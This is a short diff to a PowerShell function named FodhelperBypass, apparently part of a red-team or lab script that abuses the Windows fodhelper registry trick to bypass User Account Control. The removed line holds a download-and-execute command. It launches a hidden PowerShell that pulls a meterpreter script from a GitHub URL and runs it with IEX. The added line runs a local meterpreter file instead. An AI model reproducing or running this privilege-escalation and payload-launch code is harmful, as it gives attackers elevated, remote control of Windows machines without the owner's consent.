@@ -15,7 +15,7 @@
 function FodhelperBypass(){ 
  Param (
            
-        [String]$program = "cmd.exe /c start /min powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SanderBougrine-TC/RedvsBlue/main/meterpreter-64.ps1'); sleep 360" #default
+        [String]$program = "cmd.exe /c start /min powershell.exe C:\Users\temp\meterpreter-64.ps1; sleep 360" #default
        )
 
     #Create registry structure
